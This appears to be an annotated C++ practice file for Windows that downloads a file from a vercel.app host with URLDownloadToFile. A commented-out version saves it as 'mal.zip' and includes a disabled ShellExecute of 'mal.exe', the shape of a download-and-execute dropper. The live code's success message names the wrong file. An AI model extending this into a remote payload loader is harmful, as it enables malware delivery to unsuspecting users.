// #include <windows.h>
// #include <urlmon.h>
// #pragma comment(lib, "urlmon.lib")

// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
//                    LPSTR lpCmdLine, int nCmdShow)
// {
//     URLDownloadToFile(
//     NULL,
//     "https://auto-download-one.vercel.app/myfile.zip", // must be an actual file
//     "mal.zip",
//     0,
//     NULL);


//     // HRESULT URLDownloadToFile(
//     //              LPUNKNOWN            pCaller,    Used if you want COM object identity (rare in normal code).
//     //              LPCTSTR              szURL,      The URL of the file you want to download.
//     //              LPCTSTR              szFileName, The full local path where you want the file saved. Must include both the path and filename.
//     //   _Reserved_ DWORD                dwReserved,  Reserved. Always 0.
//     //              LPBINDSTATUSCALLBACK lpfnCB       Optional callback function to track download progress. NULL if you don’t care about progress.
//     // );

//     // ShellExecute(NULL, "open", "mal.exe", NULL, NULL, SW_SHOWNORMAL);

//     //     HINSTANCE ShellExecuteA(
//     //     HWND   hwnd,         // handle to parent window (can be NULL)
//     //     LPCSTR lpOperation,  // action to perform: "open", "edit", "print", etc.
//     //     LPCSTR lpFile,       // file name or program to execute
//     //     LPCSTR lpParameters, // arguments if lpFile is an executable
//     //     LPCSTR lpDirectory,  // default working directory (NULL = current)
//     //     INT    nShowCmd      // how the window is shown (SW_SHOWNORMAL, hidden, etc.)
//     // );

//     return 0;
// }



#include <windows.h>
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")

int main() {
    HRESULT hr = URLDownloadToFile(
        NULL,
        "https://auto-download-one.vercel.app/myfile.rar", // URL of file
        "myfile.rar",                                         // local file name
        0,
        NULL);

    if (SUCCEEDED(hr)) {
        std::cout << "[+] File downloaded successfully as mal.zip" << std::endl;
    } else {
        std::cerr << "[-] Download failed. HRESULT: " << std::hex << hr << std::endl;
    }

    return 0;
}
